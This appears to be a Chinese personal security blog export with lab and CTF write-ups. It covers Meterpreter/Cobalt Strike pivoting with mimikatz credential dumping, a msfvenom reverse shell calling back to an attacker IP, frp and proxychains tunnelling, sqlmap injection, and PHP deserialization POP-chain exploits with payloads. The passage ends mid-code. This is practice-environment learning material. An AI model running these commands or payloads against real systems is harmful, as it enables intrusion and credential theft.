ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 15</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #2</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:3480</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 16</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 18</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #5</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 22</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9</span><br><span class="line">Hardware MAC : 00:ff:44:8d:cb:b5</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.135.129</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::480f:c25c:1f43:8781</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 23</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9 #2</span><br><span class="line">Hardware MAC : 00:ff:56:0b:ea:fc</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.99.189</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4d82:616f:441c:63bd</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:d4</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.52.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::294a:a094:512a:1cda</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20211018162053236.png" alt="image-20211018162053236"></p><p>只能说 有人 发病了 还3389,</p><p>还得是 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid </span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="image-20211018162147720.png" alt="image-20211018162147720"></p><p>load mimikatz<br>kerberos<br>尝试获取明文密码，最后也没明出来 </p><p>还是嘎嘎弄socks5去 </p><p><code>run get_local_subnets</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; search socks</span><br><span class="line">msf5 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; options</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br></pre></td></tr></table></figure><p><img src="image-20211018162706618.png" alt="image-20211018162706618"></p><p><img src="image-20211018162737070.png" alt="image-20211018162737070"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p 80,445,443,22,35,3306 192.168.52.1-254</span><br></pre></td></tr></table></figure><p>你就说 这探测主机不香吗  为甚么有人发病啊</p><p><img src="image-20211018162808416.png" alt="image-20211018162808416"></p><p>探测到 P了  c</p><p>这里还能用  cs 进行信息收集 </p><p> 先是 cs复制到 kali设置好主机 和密码 </p><p>把下载好的cs复制到Kali<br>unzip解压</p><p>ls查看cs下的文件</p><p>查看是否具备Java环境</p><p><img src="image-20211018180758153.png" alt="image-20211018180758153"></p><p>然后上线</p><p><img src="image-20211018180823860.png"></p><p>利用cs与msf联动设置代理<br>cs的准备工作</p><p>开启cs服务端<br>设置IP和密码</p><p>开启客户端</p><p>设置监听</p><p>生成payload</p><p><img src="1574c10d5ed64857a8df0f8e6ec819b0.png" alt="请添加图片描述"></p><p>执行payload</p><p><img src="b1eadbcaf9fd4919bf350a58b230a41a.png" alt="请添加图片描述"></p><p>监听开始</p><p>目标主机上线</p><p><img src="image-20211018185431694.png" alt="image-20211018185431694"></p><p>系统信息收集<br>选中右键，打开beacon功能<br>查看网络配置</p><p><code>shell ipconfig /all</code></p><p>主机密码收集<br>cs读内存<br>使用hashdump</p><p><img src="image-20211018184804174.png" alt="image-20211018184804174"></p><p>cs读注册表密码<br>使用<code> logonpasswords</code></p><p><img src="image-20211018184900747.png" alt="image-20211018184900747"></p><p>开代理  </p><p><img src="image-20211018185927650.png" alt="image-20211018185927650"></p><p>添加路由</p><p>和msf连起来老是断 。</p><p>下一步扫描内网主机</p><p>net view 内网信息收集  </p><p><img src="image-20211025211617910.png" alt="image-20211025211617910"></p><p>工具不是很会用 感觉问题挺多 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs三层靶机挨打记录</title>
      <link href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>CFS</p><span id="more"></span><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210918183255816.png" alt="image-20210918183255816"></p><p>打开环境  thinkphp5 怼脸上了 这个版本洞洞很多  直接搜</p><p>找到个奇妙的 一键exp小工具</p><p>咔咔拿下第一台</p><p>查看 网卡  ifconfig</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913170027183.png" alt="image-20210913170027183"></p><p> 直接访问不了  没思路了   </p><p>被暴打 以后 giegie  说  流量转发 到外边来 </p><p>可以将靶机上线到msf</p><p>uname -a获取目标机信息</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913171028652.png" alt="image-20210913171028652"></p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.203.87.148 lport=9091 -f elf &gt; dmhz.elf</span><br></pre></td></tr></table></figure><p>生成后上传到靶机1 修改权限777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x64/meterpreter_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">use milti/handler</span><br><span class="line">也可以  </span><br><span class="line">handler -p linux/x64/meterpreter_reverse_tcp -H 10.203.87.148 -P 9091</span><br><span class="line"></span><br><span class="line">有关 msf的其他命令  </span><br><span class="line">在meterpreter下</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913173901521.png" alt="image-20210913173901521"></p><p>收到会话，成功拿到<code>meterperter</code>进入主机</p><p>用 <code>MSF</code> 中的这个命令获取当前的网段：</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913212439481.png" alt="image-20210913212439481"></p><p><code>meterpreter</code>中添加路由信息：<code>run autoroute -s 192.168.22.0/24</code></p><p>使用代理模块构建代理</p><p><code>vim /etc/proxychains4.conf</code>配置代理工具</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913191947615.png" alt="image-20210913191947615"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">route</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917161014242.png" alt="image-20210917161014242"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p>对192.168.22.0/24段进行扫描</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917160758243.png" alt="image-20210917160758243"></p><p>扫到   192.268.22.129这一堆</p><p>同时学习了 frp流量转发 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frp流量转发  </span><br><span class="line">攻击机 安装frp</span><br><span class="line">配置端口  </span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.203.87.148</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port =9091</span><br><span class="line">上传frpc  和frpc.ini文件到靶机  权限改为777</span><br><span class="line">靶机运行 ./frpc</span><br><span class="line">攻击机运行 ./frps -c frps.ini   </span><br></pre></td></tr></table></figure><p>流量转发成功。</p><p><img src="image-20210913214913042.png" alt="image-20210913214913042"></p><p><img src="image-20210913214628063.png" alt="image-20210913214628063"></p><p>是个八哥cms</p><p><img src="image-20210918183457411.png" alt="image-20210918183457411"></p><p>扫一下目录</p><p><img src="image-20210914111225355.png" alt="image-20210914111225355"></p><p>先查看 robots.txt</p><p><img src="image-20210914111327786.png" alt="image-20210914111327786"></p><p>捡到宝啦 </p><p><img src="image-20210915134225965.png" alt="image-20210915134225965"></p><p><img src="image-20210914112917498.png" alt="image-20210914112917498"></p><p>怀疑有sql  给 sqlmap配个socks代理哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py --proxy socks5://10.203.87.148:1234 -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword</span><br></pre></td></tr></table></figure><p><img src="image-20210914205706242.png" alt="image-20210914205706242"></p><p>跑出来；了  找找密码  随手dump数据库</p><p><img src="image-20210914205853366.png" alt="image-20210914205853366"></p><p>找到密码 登上去  米西米西  </p><p><code>admin/123qwe</code></p><p><img src="image-20210914205955876.png" alt="image-20210914205955876"></p><p>bagecms V3.1.3 存在  后台任意文件读取漏洞</p><p><img src="image-20210914212345124.png" alt="image-20210914212345124"></p><p>活捉   </p><p><img src="image-20210914214541122.png" alt="image-20210914214541122"></p><p>火速上车</p><p><code>ifconfig</code></p><p><img src="image-20210915134001181.png" alt="image-20210915134001181"></p><p>使用proxifiter将流量代理到10.203.87.119:1080端口使用工具，连接webshell。 下一台的情况和这台差不多，双网卡还存在一个33网段的ip，进行存活主机探测下一个 靶机  应该是通过192.168.33.0/24这块网卡继续  </p><p>使用<code>uname -a</code>查询靶机版本信息</p><p>msf生成一个  正向链接的 马    给 777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=54321 -f elf &gt; mbg.elf</span><br></pre></td></tr></table></figure><p>然后连接以后 </p><p>添加路由 </p><p>信息收集  </p><p>扫端口  </p><p>445  永恒之蓝，</p><p>靶机  跑了     。。。。。。。</p><p><strong>反思</strong></p><p>   1.对于各种  流程太不熟悉  做完一块以后   不知道  该干啥      </p><ol start="2"><li>msf不会用,   得学    下次 写总结  。</li><li>对于  网络拓补   相关知识 细节方面 不够了解   有时候知道</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化练习</title>
      <link href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>php反序列化中针对pop链的学习和练习</p></blockquote><h4 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h4><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><span id="more"></span><p>基本概念</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p><p>练习1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source))  &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来我们来分析构造pop链的过程</p><p>很明显此题考查PHP反序列化构造POP链，遇到此类题型首先寻找可以读取文件的函数，再去寻找可以互相触发从而调用的魔术方法，最终形成一条可以触发读取文件函数的POP链。<br>对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，在Read类有file_get_contents()函数，Show类有highlight_file()函数可以读取文件。接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发wakeup魔术方法，而wakeup魔术方法可以看到在Show类中。<br>再次看下<code>__wakeup</code>魔术方法中，存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的<code>__tostring</code>方法，通篇看下代码发现<code>__tostring</code>魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发<code>__tostring</code>方法。<br>再看下<code>__tostring</code>魔术方法中，首先找到str这个数组，取出key值为str的value值赋给source，那么如果这个value值不存在的话就会触发<code>__get</code>魔术方法。再次通读全篇，看到Test类中存在<code>__get</code>魔术方法。<br>那么此时如果str数组中key值为str对应的value值source是Test类的一个对象，就触发了<code>__get</code>魔术方法。看下<code>__get</code>魔术方法，发现先取Test类中的属性p给function变量，再通过return $function()把它当作函数执行，这里属性p可控。这样就会触发<code>__invoke</code>魔术方法，而<code>__invoke</code>魔术方法存在于Read类中。<br>可以看到<code>__invoke</code>魔术方法中调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可<br>POP链：unserialize函数（变量可控）–&gt;<code>__wakeup()魔术方法</code>–&gt;<code>__tostring()魔术方法</code>–&gt;<code>__get魔术方法</code>–&gt;<code>__invoke</code>魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var = &quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show &#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = new Read();</span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$t-&gt;p = $r; //赋值Test类的对象($t)下的属性p为Read类的对象($r)，触发__invoke魔术方法</span><br><span class="line">$s-&gt;str[&#x27;str&#x27;] = $t;//赋值Show类的对象($s)下的str数组的str键的值为 Test类的对象$t ，触发__get魔术方法。</span><br><span class="line">$s-&gt;source = $s;//令 Show类的对象($s)下的source属性值为此时上一步已经赋值过的$s对象，从而把对象当作字符串调用触发。__tostring魔术方法</span><br><span class="line">echo urlencode((serialize($s)));</span><br></pre></td></tr></table></figure><p>这里使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211000665.png" alt="image-20210908211000665"></p><p>最后得出来的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO</span><br></pre></td></tr></table></figure><p>最后利用结果</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908210939860.png" alt="image-20210908210939860"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211056738.png" alt="image-20210908211056738"></p><p>练习2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;string&#x27;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new Call();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化funct</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new 